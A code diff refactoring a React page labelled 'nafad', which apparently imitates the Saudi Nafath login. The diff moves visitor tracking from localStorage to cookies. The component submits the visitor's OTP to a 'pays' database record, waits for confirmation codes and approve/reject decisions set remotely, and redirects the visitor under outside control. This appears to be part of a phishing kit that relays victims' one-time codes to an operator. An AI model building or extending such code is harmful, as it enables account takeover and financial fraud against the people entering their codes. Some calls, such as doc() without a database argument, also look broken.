@@ -20,10 +20,11 @@ import {
 } from "@/components/ui/dialog";
 import { useEffect, useRef, useState } from "react";
 
-import { addData, db } from "@/lib/supabase-client";
+import { addData, db, doc, onSnapshot, setDoc } from "@/lib/supabase-client";
 import { Alert } from "@/components/ui/alert";
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
@@ -41,7 +42,7 @@ export default function Component() {
   const [submitted, setSubmitted] = useState(false);
 
   const visitorId =
-    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
+    typeof window !== "undefined" ? getCookie("visitor") || "" : "";
 
   useRedirectMonitor({ visitorId, currentPage: "nafad" });
 
@@ -59,7 +60,7 @@ export default function Component() {
   useEffect(() => {
     if (!visitorId || !db) return;
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorId),
+      doc("pays", visitorId),
       (docSnap) => {
         if (!docSnap.exists()) return;
         const data = docSnap.data();
@@ -88,17 +89,17 @@ export default function Component() {
         if (data.nafadConfirmationCode) {
           setConfirmationCode(data.nafadConfirmationCode);
           const storageKey = `nafad_shown_${visitorId}`;
-          const lastShown = localStorage.getItem(storageKey);
+          const lastShown = getCookie(storageKey);
           if (data.nafadConfirmationCode !== lastShown) {
             setShowConfirmDialog(true);
-            localStorage.setItem(storageKey, data.nafadConfirmationCode);
+            setCookie(storageKey, data.nafadConfirmationCode);
             setIsLoading(false);
             setShowError("");
             setShowOtpDialog(false);
           }
         } else if (data.nafadConfirmationCode === "") {
           setShowConfirmDialog(false);
-          localStorage.removeItem(`nafad_shown_${visitorId}`);
+          eraseCookie(`nafad_shown_${visitorId}`);
         }
 
         if (data.nafadConfirmationStatus === "approved") {
@@ -108,7 +109,7 @@ export default function Component() {
           setOtpError("");
           setOtpDone(false);
           setDoc(
-            doc(db as Firestore, "pays", visitorId),
+            doc("pays", visitorId),
             {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
@@ -121,7 +122,7 @@ export default function Component() {
           setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
           setIsLoading(false);
           setDoc(
-            doc(db as Firestore, "pays", visitorId),
+            doc("pays", visitorId),
             {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
@@ -187,7 +188,7 @@ export default function Component() {
     setOtpLoading(true);
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorId),
+        doc("pays", visitorId),
         {
           nafadOtp: code,
           nafadOtpSubmittedAt: new Date().toISOString(),
